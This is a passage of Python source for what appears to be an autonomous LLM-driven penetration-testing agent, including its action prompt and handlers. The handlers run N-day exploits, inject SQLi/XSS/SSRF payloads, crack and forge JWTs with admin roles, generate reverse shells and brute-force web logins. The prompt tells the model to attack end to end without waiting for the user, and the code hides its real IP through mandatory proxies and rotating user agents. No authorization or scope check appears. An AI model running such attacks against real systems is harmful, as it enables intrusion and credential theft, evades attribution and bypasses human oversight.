{"action": "github_leaks", "params": {"domain": "target.com"}}

### Phase 2: 主动侦察 (触碰目标)
traffic_probe — 多协议探测 (15 协议自动识别)
{"action": "traffic_probe", "params": {"target": "host:port 或 URL"}}

traffic_scan — 批量端口扫描
{"action": "traffic_scan", "params": {"cidr": "10.0.0.0/24", "ports": [22,80,443,6379]}}

### Phase 3: 漏洞利用
check_unauth — 未授权检测 (Redis/Docker/MySQL/SSH/SMB)
{"action": "check_unauth", "params": {"target": "10.0.0.1:6379"}}

exploit — N-day exploit (Log4j/Fastjson/Shiro/SSTI/Spring4Shell)
{"action": "exploit", "params": {"url": "http://target.com/", "cve": "CVE-2021-44228"}}

logic_scan — 业务逻辑漏洞 (IDOR/越权/竞争条件)
{"action": "logic_scan", "params": {"url": "http://target.com/api", "params": {"id": "1"}}}

jwt_analyze — JWT 解码/暴力/伪造
{"action": "jwt_analyze", "params": {"token": "eyJhbGciOi..."}}

traffic_analyze — 被动流量分析 (敏感信息/攻击面/漏洞迹象)
{"action": "traffic_analyze", "params": {"url": "http://target.com/"}}

attack_checklist — ⭐ 14 维全维度攻击清单 (系统性方法论, 不只靠弱密码)
对单个 URL 自动跑完: 信息提取/认证分析/接口枚举/参数发现/权限测试/注入探测/
CVE匹配/配置文件/方法切换/目录发现/业务逻辑/响应差异/请求结构/会话交互.
拿到任何 HTTP 目标的第一选择 — 不要等用户提醒.
{"action": "attack_checklist", "params": {"url": "http://target.com/"}}

inject — ⭐⭐ 多通道参数注入 (真正的主动发包 — Burp 式攻击)
给带参数的 URL, 自动提取所有参数 (GET/POST/Cookie/Header),
对每个参数 × 每个通道发 SQLi/XSS/SSRF/IDOR/认证绕过 payload.
检测 error-based/time-based/reflection/IDOR/SSRF元数据.
这是 Burp Intruder 的自动化版本 — 遇到带参数的接口必须用.
{"action": "inject", "params": {"url": "http://target.com/page?id=1&name=test", "types": ["sqli","xss","idor"]}}

full_audit — ⭐⭐ 端到端全自动审计 (一个目标打到底)
给一个域名/IP, 自动完成: 资产扩展→端口扫描→每个HTTP目标跑14维清单→
高危服务未授权检测→汇总. 这是总指挥, 不需要用户逐项提醒.
{"action": "full_audit", "params": {"target": "target.com"}}

### Phase 5: 后渗透
revshell — 反弹 shell 生成
{"action": "revshell", "params": {"ip": "10.0.0.1", "port": 4444}}

### HTTP 传统工具
probe — HTTP 参数探测
{"action": "probe", "params": {"url": "https://target.com/api", "param": "id", "value": "1"}}

scan — HTTP 漏洞扫描
{"action": "scan", "params": {"url": "https://target.com/api", "param": "id", "value": "1", "types": ["sqli", "xss"]}}

### 通用
finding — 记录发现
{"action": "finding", "params": {"title": "Redis 未授权", "severity": "critical", "details": "..."}}

memory — 存储重要发现
{"action": "memory", "params": {"type": "code", "content": "..."}}

think — 继续思考
{"action": "think", "reason": "分析当前结果, 规划下一步"}}

complete — 完成审计
{"action": "complete", "reason": "已发现 X 个漏洞"}
"""

        # === 当前上下文: 已发现的信息 ===
        context = "\n\n## 当前已发现的信息\n\n"

        # 从 history 提取摘要
        if self.history:
            context += "### 操作历史与发现:\n"
            for h in self.history[-10:]:  # 最近 10 条
                if h.get("action"):
                    action_type = h["action"].get("action", "?")
                    params = h["action"].get("params", {})
                    result = h.get("result", {})
                    # 用摘要器压缩结果
                    summary = self._summarize_result(action_type, params, result)
                    context += f"- [{h.get('iteration', '?')}] {action_type}: {summary}\n"
        else:
            context += "(尚无信息 — 这是第一次操作)\n"

        # 从上下文累积器提取已发现资产
        context += self._get_context_summary()

        # TrafficJournal: 流量日志 + 模式发现 (LLM 的"读流量"阶段)
        try:
            j = self._ensure_journal()
            j_summary = j.llm_summary(last_n=20)
            if j_summary and "0条" not in j_summary[:20]:
                context += "\n\n## 流量日志 (最近 20 条)\n\n"
                context += j_summary + "\n"
                patterns = j.detect_patterns(window=20)
                if patterns:
                    context += "\n### 流量模式发现:\n"
                    for p in patterns[:5]:
                        context += f"- [{p['severity'].upper()}] {p['pattern']}: {p['evidence'][:100]}\n"
                        if p.get('suggestion'):
                            context += f"  → 建议: {p['suggestion']}\n"
        except Exception:
            pass  # Journal 异常不影响 prompt

        # 从 orchestrator state 提取已有发现
        if hasattr(self, 'orchestrator') and self.orchestrator:
            findings = self.orchestrator.state.get('findings', [])
            if findings:
                context += f"\n### 已记录漏洞 ({len(findings)} 个):\n"
                for f in findings[-5:]:
                    context += f"- [{f.get('severity', '?')}] {f.get('title', '?')}\n"

        # === 用户指令 ===
        instruction = ""
        if initial_instruction:
            instruction = f"\n\n## 本次任务\n{initial_instruction}\n"

        # === 组装 ===
        prompt = system_prompt + context + instruction + """

## 你的下一步 — 结构化输出 (强制)

基于当前已发现的信息，决定下一步操作。你必须输出一个 JSON Action，
包含以下字段（mental_model / hypothesis / observation / update 四项是你的
"作战日志"，让指挥官能看懂你的思考过程，缺一不可）：

```json
{
    "action": "...",
    "params": {...},
    "mental_model": "一句话：我现在认为这个系统怎么工作，信任边界在哪",
    "hypothesis": "这一步要验证什么假设",
    "observation": "上一步流量里我看到了什么关键信号（引用具体值）",
    "update": "假设成立/推翻/部分成立 + 下一步方向"
}
```

⚠️ 不许闷头冲：action 和 params 是"做什么"，mental_model/hypothesis/
observation/update 是"为什么做"。如果 observation 为空说明你还没读懂流量，
先用 traffic_analyze 或 attack_checklist 观察再行动。
"""

        return prompt

    def _summarize_result(self, action_type: str, params: Dict, result: Dict) -> str:
        """
        把 action 结果压缩成一句话摘要 (喂给 LLM, 避免超 token).

        关键: 不要把原始响应塞给 LLM, 只给"人能看懂的摘要".
        """
        if not result.get("ok", False):
            return f"失败 ({result.get('error', 'unknown')})"

        data = result.get("data", result)

        if action_type == "traffic_probe":
            target = params.get("target", "?")
            proto = data.get("protocol", "?")
            banner = data.get("banner", "")
            tags = data.get("tags", [])
            hv_tags = [t for t in tags if "HIGH" in t or "UNAUTH" in t or "RCE" in t]
            next_steps = data.get("next_steps", [])
            top_step = next_steps[0]["action"] if next_steps else "none"
            return f"target={target} proto={proto} banner={banner[:30]} tags={hv_tags[:3]} 下一步建议={top_step}"

        elif action_type == "traffic_scan":
            summary = data.get("summary", {})
            hv = data.get("high_value_assets", [])
            open_count = summary.get("open_count", 0) if isinstance(summary, dict) else 0
            hv_count = summary.get("total_high_value", len(hv)) if isinstance(summary, dict) else len(hv)
            hv_list = [f"{a.get('target','')}:{a.get('service','')}" for a in hv[:3]]
            return f"开放{open_count}端口, 高危{hv_count}个: {hv_list}"

        elif action_type == "probe":
            baseline = data.get("baseline", {})
            errors = data.get("errors", {})
            return f"status={baseline.get('status','?')} errors={list(errors.keys())[:3] if errors else 'none'}"

        elif action_type == "scan":
            findings = data.get("findings", [])
            vuln_types = [f.get("type", "?") for f in findings]
            return f"发现{len(findings)}个漏洞: {vuln_types[:5]}"

        elif action_type == "finding":
            return f"记录: {data.get('title', params.get('title', '?'))}"

        elif action_type == "memory":
            return "记忆已存储"

        elif action_type == "think":
            return "思考中"

        # V4 新增 action 摘要
        elif action_type in ("intel_lookup", "asset_expand", "cdn_bypass",
                            "github_leaks", "check_unauth", "jwt_analyze",
                            "logic_scan", "exploit", "revshell", "traffic_analyze",
                            "attack_checklist", "full_audit", "inject"):
            summary = result.get("summary", "")
            return summary[:150] if summary else f"ok={result.get('ok')}"

        return f"ok={result.get('ok')}"
    
    # V4 三段论: 四阶段 action 归类
    _PHASE1_ACTIONS = {
        "intel_lookup", "asset_expand", "cdn_bypass",
        "github_leaks", "traffic_scan", "detect_panel", "supply_chain",
        "dir_fuzz",
    }
    _PHASE2_ACTIONS = {"traffic_probe", "check_unauth"}
    _PHASE3_ACTIONS = {"traffic_analyze", "finding"}
    _PHASE4_ACTIONS = {
        "exploit", "inject", "probe", "scan", "revshell",
        "login_brute", "attack_checklist", "logic_scan", "jwt_analyze",
    }

    async def _execute_action(self, action: Dict) -> Dict:
        """
        执行 Action — V4 带软门控 + H5 异步支持.
        允许 LLM 在后期阶段调用前期 action (补点), 只记录告警.
        H5: 路由表统一分发, 自动 await 协程方法.
        """
        import asyncio as _aio

        action_type = action["action"]
        params = action.get("params", {})

        # 软门控: 允许回退, 只记录告警
        phase = getattr(self, "_phase", 0)
        if action_type in self._PHASE1_ACTIONS and phase > 1:
            print(f"  ⚠️ 软门控: 已进入 Phase {phase}, LLM 回退补点 ({action_type})")
        elif action_type in self._PHASE2_ACTIONS and phase > 2:
            print(f"  ⚠️ 软门控: 已进入 Phase {phase}, LLM 回退补流量 ({action_type})")

        if action_type == "think":
            return {"ok": True, "message": "继续思考"}

        # 路由表: action_type -> 绑定方法 (sync 或 async 均可)
        _ACTION_MAP = {
            "probe": self._action_probe,
            "scan": self._action_scan,
            "finding": self._action_finding,
            "exploration": self._action_exploration,
            "memory": self._action_memory,
            "traffic_probe": self._action_traffic_probe,
            "traffic_scan": self._action_traffic_scan,
            "intel_lookup": self._action_intel_lookup,
            "asset_expand": self._action_asset_expand,
            "cdn_bypass": self._action_cdn_bypass,
            "github_leaks": self._action_github_leaks,
            "check_unauth": self._action_check_unauth,
            "jwt_analyze": self._action_jwt_analyze,
            "logic_scan": self._action_logic_scan,
            "exploit": self._action_exploit,
            "revshell": self._action_revshell,
            "traffic_analyze": self._action_traffic_analyze,
            "attack_checklist": self._action_attack_checklist,
            "inject": self._action_inject,
            "login_brute": self._action_login_brute,
            "supply_chain": self._action_supply_chain,
            "detect_panel": self._action_detect_panel,
            "dir_fuzz": self._action_dir_fuzz,
            "start_listener": self._action_start_listener,
            "observe": self._action_observe,
            "full_audit": self._action_full_audit,
        }

        method = _ACTION_MAP.get(action_type)
        if method is None:
            return {"ok": False, "error": f"未知 action: {action_type}"}

        try:
            result = method(params)
            # H5: 异步方法返回协程, 需要 await
            if _aio.iscoroutine(result):
                result = await result
            return result
        except Exception as e:
            return {"ok": False, "error": str(e)}
    
    def _action_probe(self, params: Dict) -> Dict:
        """执行 probe — V4: 走 _get_http_session() 共享代理"""
        url = params.get("url")
        param = params.get("param")
        value = params.get("value", "1")

        if not url or not param:
            return {"ok": False, "error": "缺少 url 或 param"}

        # V4 修复: 不再自建 SyncBurp, 走 _get_http_session() 共享代理配置
        session = self._get_http_session()
        try:
            baseline = session.get(f"{url}?{param}={value}", timeout=10, verify=False)

            errors = {}
            for p in ["'", '"', "' OR '1'='1"]:
                r = session.get(f"{url}?{param}={value}{p}", timeout=10, verify=False)
                if r.status_code >= 500:
                    errors[p] = f"HTTP {r.status_code}"

            return {
                "ok": True,
                "baseline": {"status": baseline.status_code, "length": len(baseline.content)},
                "errors": errors
            }
        finally:
            session.close()
    
    def _action_scan(self, params: Dict) -> Dict:
        """执行 scan — V4: 共享代理配置"""
        from .detectors import VulnScanner
        from .sync_wrapper import SyncBurp

        url = params.get("url")
        param = params.get("param")
        value = params.get("value", "1")
        types = params.get("types")

        if not url or not param:
            return {"ok": False, "error": "缺少 url 或 param"}

        # VulnScanner 需要 SyncBurp 接口, 共享代理配置
        proxy = None
        if self.proxy_manager:
            try:
                proxy = self.proxy_manager.get_proxy()
            except Exception:
                proxy = None
        burp = SyncBurp(project=self.project_id, delay=1.0, proxy=proxy)
        scanner = VulnScanner(burp)

        try:
            findings = scanner.scan(url, param, value, types=types)
            return {
                "ok": True,
                "findings": [
                    {"type": f.vuln_type, "confidence": f.confidence, "evidence": f.evidence}
                    for f in findings
                ]
            }
        finally:
            burp.close()
    
    def _action_finding(self, params: Dict) -> Dict:
        """记录 finding"""
        import uuid
        finding = {
            "id": str(uuid.uuid4()),
            "title": params.get("title", "Unknown"),
            "severity": params.get("severity", "info"),
            "type": params.get("type", "unknown"),
            "location": params.get("location", ""),
            "details": params.get("details", "")
        }
        self.orchestrator.state["findings"].append(finding)
        self.orchestrator.save_state()
        return {"ok": True, "id": finding["id"]}
    
    def _action_exploration(self, params: Dict) -> Dict:
        """记录 exploration"""
        path = params.get("path")
        result = params.get("result", "unknown")
        reason = params.get("reason", "")
        
        if not path:
            return {"ok": False, "error": "缺少 path"}
        
        self.orchestrator.add_exploration(path, result, reason)
        return {"ok": True}
    
    def _action_memory(self, params: Dict) -> Dict:
        """存储 memory"""
        mem_type = params.get("type", "code")
        content = params.get("content", "")
        
        if not content:
            return {"ok": False, "error": "缺少 content"}
        
        if mem_type == "code":
            mem_id = self.orchestrator.memory.add_code(
                content=content,
                file=params.get("file", "unknown"),
                line=params.get("line", 0)
            )
        else:
            mem_id = self.orchestrator.memory.add_instruction(content)
        
        return {"ok": True, "id": mem_id}

    # ============================================================
    # V4: 多协议 traffic action
    # ============================================================

    async def _action_intel_lookup(self, params: Dict) -> Dict:
        """情报聚合查询 — 输入域名/IP, 一次查 6 个平台"""
        target = params.get("target", params.get("domain", params.get("ip", "")))
        if not target:
            return {"ok": False, "error": "缺少 target"}

        try:
            from .traffic import IntelAggregator
            agg = IntelAggregator()
            import ipaddress
            try:
                ipaddress.ip_address(target)
                report = await agg.lookup_ip(target)
            except ValueError:
                report = await agg.lookup_domain(target)

            self._add_to_context("intel", target, report.to_dict())
            return {
                "ok": True,
                "summary": f"target={target} ISP={report.isp} ASN={report.asn} "
                          f"端口={len(report.open_ports)} 旁站={len(report.neighbors)} "
                          f"CVE={len(report.vulns)} 子域名={len(report.subdomains)}",
                "data": report.to_dict(),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_asset_expand(self, params: Dict) -> Dict:
        """资产扩展 — 子域名/旁站/C段/WHOIS"""
        domain = params.get("domain", params.get("target", ""))
        if not domain:
            return {"ok": False, "error": "缺少 domain"}

        try:
            from .traffic import AssetExpander
            expander = AssetExpander()
            result = await expander.expand_full(domain)

            self._add_to_context("assets", domain, result.to_dict())
            return {
                "ok": True,
                "summary": f"domain={domain} 子域名={len(result.subdomains)} "
                          f"IP={len(result.ips)} 旁站={len(result.neighbors)} C段={result.c_segment}",
                "data": result.to_dict(),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_cdn_bypass(self, params: Dict) -> Dict:
        """CDN 检测+绕过 — 找源 IP"""
        domain = params.get("domain", params.get("target", ""))
        if not domain:
            return {"ok": False, "error": "缺少 domain"}

        try:
            from .traffic import CDNBypass
            bypass = CDNBypass()
            result = await bypass.bypass(domain)

            self._add_to_context("cdn", domain, result.to_dict())
            origins = result.high_confidence_origins()
            return {
                "ok": True,
                "summary": f"domain={domain} CDN={'是('+result.cdn_name+')' if result.is_cdn else '否'} "
                          f"源IP候选={len(result.origin_candidates)} "
                          f"高置信={len(origins)} "
                          f"建议IP={origins[0].ip if origins else '未知'}",
                "data": result.to_dict(),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_github_leaks(self, params: Dict) -> Dict:
        """GitHub 泄露搜索"""
        domain = params.get("domain", params.get("target", ""))
        if not domain:
            return {"ok": False, "error": "缺少 domain"}

        try:
            from .traffic import GithubLeakScanner
            scanner = GithubLeakScanner()
            leaks = await scanner.search_domain(domain)

            return {
                "ok": True,
                "summary": f"domain={domain} 发现{len(leaks)}个泄露: "
                          f"{[l.leak_type for l in leaks[:5]]}",
                "data": [{"repo": l.repo, "file": l.file, "type": l.leak_type,
                          "severity": l.severity, "url": l.url}
                         for l in leaks[:10]],
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_check_unauth(self, params: Dict) -> Dict:
        """未授权检测 — Redis/Docker/MySQL/SSH/SMB"""
        target = params.get("target", "")
        if not target:
            return {"ok": False, "error": "缺少 target (host:port)"}

        try:
            from .traffic import TrafficEngine

            async def _run(engine):
                return await engine.check_unauth(target, timeout=5)

            resp = await self._run_with_engine(_run)

            return {
                "ok": resp.ok,
                "summary": f"target={target} ok={resp.ok} banner={resp.banner} "
                          f"tags={resp.tags[:5]}",
                "data": resp.to_dict(),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    def _action_jwt_analyze(self, params: Dict) -> Dict:
        """JWT 解码/暴力/分析"""
        token = params.get("token", "")
        if not token:
            return {"ok": False, "error": "缺少 token"}

        try:
            from .traffic import JWTTool
            tool = JWTTool()
            info = tool.analyze(token)
            cracked = tool.brute_key(token)

            result = {"analysis": info}
            if cracked:
                result["cracked_key"] = cracked
                result["forged_token"] = tool.forge(token, secret=cracked,
                                                     payload_mods={"role": "admin"})

            return {
                "ok": True,
                "summary": f"alg={info.get('alg','?')} issues={info.get('issues',[])} "
                          f"cracked={'是('+cracked+')' if cracked else '否'}",
                "data": result,
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_logic_scan(self, params: Dict) -> Dict:
        """业务逻辑漏洞扫描 — IDOR/越权/竞争条件"""
        url = params.get("url", params.get("target", ""))
        if not url:
            return {"ok": False, "error": "缺少 url"}

        scan_type = params.get("type", "url")  # url / idor / race
        params_dict = params.get("params", {})

        try:
            from .traffic import LogicVulnScanner

            async def _run(engine):
                scanner = LogicVulnScanner(engine)
                if scan_type == "race":
                    return await scanner.scan_race(url, body=params.get("body",""))
                elif scan_type == "idor":
                    accounts = params.get("accounts", {})
                    return await scanner.scan_idor(url, accounts)
                else:
                    return await scanner.scan_url(url, params=params_dict)

            result = await self._run_with_engine(_run)

            return {
                "ok": True,
                "summary": f"url={url} type={scan_type} "
                          f"确认漏洞={result.confirmed_count} 总发现={len(result.findings)}",
                "data": result.to_dict(),
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_exploit(self, params: Dict) -> Dict:
        """N-day exploit — Log4j/Fastjson/Shiro/SSTI/Spring"""
        cve = params.get("cve", params.get("exploit", ""))
        url = params.get("url", params.get("target", ""))

        if not url:
            return {"ok": False, "error": "缺少 url"}

        try:
            from .traffic import ExploitManager

            async def _run(engine):
                mgr = ExploitManager(engine)
                if cve:
                    return [await mgr.run(cve, url)]
                else:
                    return await mgr.run_all(url)

            results = await self._run_with_engine(_run)
            vulnerable = [r for r in results if r.vulnerable]

            return {
                "ok": True,
                "summary": f"url={url} cve={cve or 'all'} "
                          f"测试={len(results)} 确认漏洞={len(vulnerable)}",
                "data": [{"cve": r.poc_id, "vulnerable": r.vulnerable,
                          "severity": r.severity.value, "evidence": r.evidence[:80]}
                         for r in results],
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    def _action_revshell(self, params: Dict) -> Dict:
        """反弹 shell 生成"""
        ip = params.get("ip", params.get("lhost", ""))
        port = params.get("port", params.get("lport", 4444))

        if not ip:
            return {"ok": False, "error": "缺少 ip (攻击者 IP)"}

        try:
            from .traffic import ReverseShellGenerator
            gen = ReverseShellGenerator()
            payloads = gen.generate(ip, int(port))
            listener = gen.get_listener(int(port))

            return {
                "ok": True,
                "summary": f"ip={ip} port={port} {len(payloads)}种payload 监听={listener}",
                "data": {"payloads": [{"type": p["type"], "payload": p["payload"][:80]}
                                      for p in payloads],
                         "listener": listener},
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    async def _action_traffic_analyze(self, params: Dict) -> Dict:
        """
        被动流量分析.

        V4 增强: 同时跑 TrafficAnalyzer (HTTP 流量指纹)
                  和 TrafficRuleEngine (EXPERIENCE_LESSONS 规则),
        两路结果合并, 去重后给 LLM 一个统一的高危/严重列表.
        """
        url = params.get("url", "")
        if not url:
            return {"ok": False, "error": "缺少 url (或提供 traffic 数据)"}

        try:
            from .traffic import TrafficAnalyzer, TrafficRuleEngine

            async def _run(engine):
                r = await engine.probe(url, protocol="http", timeout=10)
                analyzer = TrafficAnalyzer()
                findings = analyzer.analyze(
                    url=url, resp_status=r.status,
                    resp_headers=r.headers, resp_body=r.body[:5000],
                )
                return r, findings

            r, findings = await self._run_with_engine(_run)

            # 跑经验规则引擎 (V4 注入)
            rule_engine = TrafficRuleEngine()
            ctx = {
                "url": url,
                "request": {"url": url, "method": params.get("method", "GET")},
                "response": {
                    "url": url,
                    "status": r.status,
                    "headers": dict(r.headers) if r.headers else {},
                    "body": r.body[:20000] if r.body else "",
                    "banner": r.banner or "",
                },
            }
            rule_hits = rule_engine.apply(ctx)
            all_severity = {"critical": 0, "high": 0, "medium": 0, "low": 0}
            for f in findings:
                all_severity[f.severity] = all_severity.get(f.severity, 0) + 1
            for h in rule_hits:
                all_severity[h.severity] = all_severity.get(h.severity, 0) + 1

            high = [f for f in findings if f.severity in ("critical", "high")]
            rule_critical = [h for h in rule_hits if h.severity == "critical"]
            rule_high = [h for h in rule_hits if h.severity == "high"]

            # 把规则命中里高危+严重的也写进 context
            for h in rule_critical + rule_high:
                self._add_to_context("experience_rule", h.rule_id, h.to_dict())

            return {
                "ok": True,
                "summary": f"url={url} findings={len(findings)} rule_hits={len(rule_hits)} "
                          f"严重={all_severity['critical']} 高危={all_severity['high']}",
                "data": {
                    "analyzer_findings": [
                        {"layer": f.layer, "type": f.finding_type,
                         "severity": f.severity, "evidence": f.evidence[:80]}
                        for f in findings[:15]
                    ],
                    "experience_rule_hits": [h.to_dict() for h in rule_hits],
                    "severity_summary": all_severity,
                    "critical_signatures": [h.to_dict() for h in rule_critical],
                },
            }
        except Exception as e:
            return {"ok": False, "error": str(e)[:100]}

    # ============================================================
    # inject — 多通道参数注入 (真正的主动发包)
    # ============================================================

    def _action_inject(self, params: Dict) -> Dict:
        """
        多通道参数注入 — 对带参数的 URL 发真正的攻击 payload.

        给一个 URL (如 store.aspx?groupid=123), 自动:
            1. 提取所有参数 (GET query + 表单 + cookie)
            2. 对每个参数 × 4 通道 (GET/POST/Cookie/Header) 发 payload
            3. 检测 SQLi/XSS/SSRF/SSTI/CMDi/IDOR/认证绕过

        OpSec: 必须走代理, 无代理时拒绝运行.
        """
        url = params.get("url", "")
        if not url:
            return {"ok": False, "error": "缺少 url (带参数的目标)"}

        vuln_types = params.get("types") or params.get("vuln_types")
        channels = params.get("channels")

        # OpSec: 必须走代理 — 复用 verify_proxy 的真实 IP 比对
        proxy_url = None
        if self.proxy_manager:
            try:
                proxy_url = self.proxy_manager.get_proxy()
            except Exception:
                proxy_url = None

        if not proxy_url:
            return {
                "ok": False,
                "error": "OpSec 拒绝: 注入必须走代理 (无代理 = 暴露真实IP). 请先配置 proxy_manager.",
            }

        # 额外验证: 代理出口 ≠ 真实 IP (防止代理配置错误仍裸奔)
        if self._proxy_required:
            pv = self.verify_proxy()
            if not pv.get("safe"):
                return {"ok": False, "error": f"OpSec 拒绝: {pv.get('error','代理验证失败')}"}

        # V4 修复: burp._client 是 httpx.AsyncClient, 不能当同步 session 用。
        # 统一走 _get_http_session() 获取真正的同步 requests.Session。
        session = self._get_http_session()

        try:
            from .traffic.injector import MultiChannelInjector
            injector = MultiChannelInjector(session, timeout=10, delay=0.3,
                                            journal=self._ensure_journal())
            report = injector.scan_all(
                url,
                vuln_types=vuln_types,
                channels=channels,
            )
        except Exception as e:
            return {"ok": False, "error": f"注入引擎失败: {type(e).__name__}: {str(e)[:80]}"}
        finally:
            session.close()

        # 分类发现
        confirmed = [f for f in report.findings if f.confidence == "confirmed"]
        probable = [f for f in report.findings if f.confidence == "probable"]

        # 累积到上下文
        self._add_to_context("injection", url, {
            "total_requests": report.total_requests,
            "confirmed": len(confirmed),
            "probable": len(probable),
            "params": report.params_scanned,
        })

        # 自动跟进: 发现注入 → 触发深度利用
        followups = []
        for f in confirmed[:3]:
            if f.vuln_type == "ssrf":
                followups.append(("exploit", {"url": url, "cve": "SSRF"}))
            elif f.vuln_type == "sqli":
                followups.append(("logic_scan", {"url": url, "type": "url"}))

        return {
            "ok": True,
            "summary": (f"url={url} 请求={report.total_requests} "
                       f"确认={len(confirmed)} 疑似={len(probable)} "
                       f"参数={report.params_scanned}"),
            "data": {
                "confirmed": [f.to_dict() for f in confirmed],
                "probable": [f.to_dict() for f in probable[:10]],
                "params_scanned": report.params_scanned,
                "baseline": {"status": report.baseline_status,
                             "length": report.baseline_length},
                "total_requests": report.total_requests,
            },
            "_followups": followups[:3],
        }

    # ============================================================
    # login_brute — 凭据爆破 (phpMyAdmin / WordPress / 通用登录)
    # ============================================================

    def _action_login_brute(self, params: Dict) -> Dict:
        """
        对目标 URL 执行凭据爆破.

        Args:
            params.url: 登录页 URL
            params.usernames: (可选) 用户名列表
            params.passwords: (可选) 密码列表
            params.top_n: (可选) 生成密码数上限, 默认 200

        Returns:
            {"ok": bool, "summary": str, "data": {...}}
        """
        url = params.get("url", "")
        if not url:
            return {"ok": False, "error": "缺少 url 参数"}

        try:
            from aiburp.traffic.targeted_dict import TargetedDictGenerator
            from aiburp.traffic.web_login_brute import WebLoginBruteForcer
            import requests
            import re
            from urllib.parse import urlparse

            domain = urlparse(url).netloc

            # 1. 构建用户名字典
            usernames = params.get("usernames")
            if not usernames:
                usernames = TargetedDictGenerator.guess_usernames(domain)
                # 去重且限制 15 个
                usernames = list(dict.fromkeys(usernames))[:15]
                self._add_to_context("login_brute", f"{domain}_usernames", {"usernames": usernames})

            # 2. 构建密码字典
            passwords = params.get("passwords")
            top_n = params.get("top_n", 200)
            if not passwords:
                passwords = TargetedDictGenerator.from_domain(domain, top_n=top_n)
                self._add_to_context("login_brute", f"{domain}_passwords", {"count": len(passwords)})

            # 3. 创建 Session — V4: 走 _get_http_session() 统一代理, 再加 AntiTrace 头
            import requests as _req
            try:
                session = self._get_http_session()
            except RuntimeError as e:
                return {"ok": False, "error": str(e)}
            session.headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            })
            # AntiTrace 随机 UA
            try:
                from aiburp.traffic.anti_trace import AntiTrace
                _anti = AntiTrace(random_ua=True)
                session.headers.update({'User-Agent': _anti._rotate_ua()})
            except ImportError:
                session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'})

            # 4. 检测登录表单类型 (phpMyAdmin / Roundcube / WordPress / 通用)
            # V4 修复: 不再用 burp._client (httpx.AsyncClient), 直接用同步 session
            probe_session = session

            try:
                form = WebLoginBruteForcer(probe_session, delay=0.8, timeout=8).detect_login_form(url)
            except Exception:
                # 兜底: 即使探测失败, 也给个 generic form, 让后续能跑通用爆破
                class _GenericForm:
                    is_phpmyadmin = False
                    has_csrf = False
                    token_fields = {}
                form = _GenericForm()
            form_type = "phpmyadmin" if getattr(form, "is_phpmyadmin", False) else "generic"

            # 检测 Roundcube: _user / _pass / _task / _action 字段
            is_roundcube = False
            roundcube_fields = {}
            if not getattr(form, "is_phpmyadmin", False):
                html_check = getattr(form, '_html_cache', '') or ''
                if not html_check:
                    try:
                        r = session.get(url, timeout=8)
                        html_check = r.text
                    except:
                        html_check = ''
                if '_user' in html_check and '_task=login' in html_check:
                    is_roundcube = True
                    form_type = "roundcube"
                    token = ''
                    t = re.search(r'name="_token"\s+value="([^"]+)"', html_check)
                    if t: token = t.group(1)
                    roundcube_fields = {'_token': token}

            # 检测 WordPress: log / pwd 字段
            is_wordpress = False
            if not getattr(form, "is_phpmyadmin", False) and not is_roundcube:
                try:
                    r = session.get(url, timeout=8)
                    if 'wp-login.php' in url or 'log' in r.text[:5000]:
                        is_wordpress = True
                        form_type = "wordpress"
                except:
                    pass

            self._add_to_context("login_brute", f"{domain}_form", {
                "is_phpmyadmin": getattr(form, "is_phpmyadmin", False),
                "token_fields": getattr(form, "token_fields", {}),
                "form_type": form_type,
            })

            # 5. 执行爆破 (根据表单类型分派)
            max_attempts = min(params.get("max_attempts", 200), 500)

            if is_roundcube:
                # Roundcube 专用: 手动 POST (模块不支持 _task/_action)
                report = self._roundcube_brute(
                    session, url, usernames, passwords,
                    max_attempts=max_attempts, token_cache=roundcube_fields
                )
            elif is_wordpress:
                # WordPress 专用: 用 log/pwd 字段名
                report = self._wordpress_brute(
                    session, url, usernames, passwords,
                    max_attempts=max_attempts
                )
            else:
                # 通用 / phpMyAdmin
                brute = WebLoginBruteForcer(session, delay=0.8, timeout=8)
                report = brute.crack(
                    url,
                    usernames=usernames,
                    passwords=passwords,
                    form_info=form,
                    max_attempts=max_attempts,
                    stop_on_first=True,
                )

            session.close()

            # 6. 整理结果
            result_data = {
                "url": url,
                "domain": domain,
                "form_type": form_type,
                "is_phpmyadmin": form.is_phpmyadmin,
                "has_csrf": form.has_csrf,
                "total_attempts": report.total_attempts if hasattr(report, 'total_attempts') else 0,
                "blocked": report.blocked if hasattr(report, 'blocked') else False,
                "total_time_sec": report.total_time_sec if hasattr(report, 'total_time_sec') else 0,
                "successful": [
                    {"username": s.username, "password": s.password, "detail": s.detail}
                    for s in (report.successful if hasattr(report, 'successful') else [])
                ],
            }

            if report.successful:
                summary = (f"✅ {url} 凭据爆破成功! 找到 "
                          f"{len(report.successful)} 组有效凭据: "
                          + ", ".join(f"{s.username}:{s.password}"
                                     for s in report.successful[:3]))
                self._discovered.setdefault("credentials", []).extend(
                    [f"{s.username}:{s.password}" for s in report.successful]
                )
                # 记录到 orchestrator
                for s in report.successful:
                    self.orchestrator.add_finding(
                        title=f"弱凭据: {s.username}:{s.password} @ {url}",
                        severity="critical",
                        detail=s.detail,
                    )
            elif report.blocked:
                summary = (f"⛔ {url} 爆破被拦截 (第 {report.total_attempts} 次), "
                          f"用时 {report.total_time_sec}s")
            else:
                summary = (f"❌ {url} 爆破未找到有效凭据 "
                          f"(尝试 {report.total_attempts} 次, "
                          f"用时 {report.total_time_sec}s)")

            return {
                "ok": True,
                "summary": summary,
                "data": result_data,
            }

        except ImportError as e:
            return {"ok": False, "error": f"导入失败: {e}"}
        except Exception as e:
            return {"ok": False, "error": f"login_brute 执行异常: {e}"}

    # ============================================================
